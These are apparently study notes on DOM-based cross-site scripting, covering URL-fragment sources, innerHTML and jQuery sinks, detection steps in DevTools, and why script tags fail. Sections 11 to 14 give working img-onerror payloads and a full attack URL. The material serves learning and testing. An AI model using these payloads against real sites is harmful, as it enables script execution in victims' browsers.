#  DOM-Based XSS Notes

---

##  1. What is DOM XSS?

DOM-Based XSS is a type of **Non-Persistent XSS** where:

* The attack is executed entirely in the **browser (client-side)**
* The input never reaches the **backend server**
* JavaScript modifies the page using the **DOM (Document Object Model)**

### Definition:

DOM XSS occurs when JavaScript takes user input and writes it into the page **without proper sanitization**.

---

##  2. How DOM XSS Works (Flow)

### Step-by-step:

1. User input is placed in the URL (usually after `#`)
2. JavaScript reads this input
3. JavaScript writes it into the DOM
4. Browser executes it

---

##  3. Example (To-Do App)

### Input:

```bash
test
```

### URL:

```bash
http://site.com/#task=test
```

### Output:

```bash
Next Task: test
```

---

##  4. Key Observation (Very Important)

 Open DevTools → Network tab
 Add input again

 You will see **NO HTTP request**

### This means:

* Server is NOT involved
* Everything happens in the browser

---

##  5. URL Fragment (#)

```bash
http://site.com/#task=test
```

* `#task=test` is called a **URL fragment**
* Processed only in the browser
* NOT sent to server

 Strong indicator of DOM XSS

---

## 6. Why Input is NOT in Page Source

 Press `CTRL + U` (View Page Source)

 Input will NOT appear

### Reason:

* JavaScript updates page **after load**

 Use:

```bash
Inspect Element (CTRL + SHIFT + C)
```

---

##  7. Source & Sink Concept (VERY IMPORTANT)

###  Source (Input origin)

```javascript
var pos = document.URL.indexOf("task=");
var task = document.URL.substring(pos + 5);
```

 Input comes from:

```bash
URL
```

---

###  Sink (Where input is used)

```javascript
document.getElementById("todo").innerHTML =
"<b>Next Task:</b> " + decodeURIComponent(task);
```

Input written into:

```bash
DOM
```

---

##  8. Why DOM XSS Happens

* Attacker controls input (Source)
* Input is written into DOM (Sink)
* No sanitization applied

 Result: **XSS Vulnerability**

---

##  9. Dangerous Sink Functions

### Common:

```javascript
innerHTML
outerHTML
document.write()
```

### jQuery:

```javascript
append()
after()
add()
```

 If used without sanitization → XSS possible

---

##  10. Why `<script>` Does NOT Work

```html
<script>alert(1)</script>
```

 Usually does NOT execute

### Reason:

* `innerHTML` blocks `<script>` tags

---

##  11. Working DOM XSS Payload

```html
<img src="" onerror=alert(window.origin)>
```

---

##  12. How Payload Works

```html
<img src="">
```

→ Image fails to load

```html
onerror=alert(window.origin)
```

→ JS executes on error

 Result: Alert popup

---

##  13. Full Attack URL

```bash
http://site.com/#task=<img src="" onerror=alert(window.origin)>
```

 When victim opens → JS executes

---

##  14. How to Detect DOM XSS

### Steps:

1. Check URL for `#` parameter
2. Open DevTools → Network tab
3. No request → client-side
4. Inspect JavaScript code

---

###   Look for:

```javascript
innerHTML
document.write()
```

---

###  Test Payload:

```html
<img src=x onerror=alert(1)>
```

---

##  Key Takeaways

* DOM XSS = Client-side execution
* No server involvement
* Source → Sink flow is critical
* `<script>` often blocked
* Use event-based payloads

---
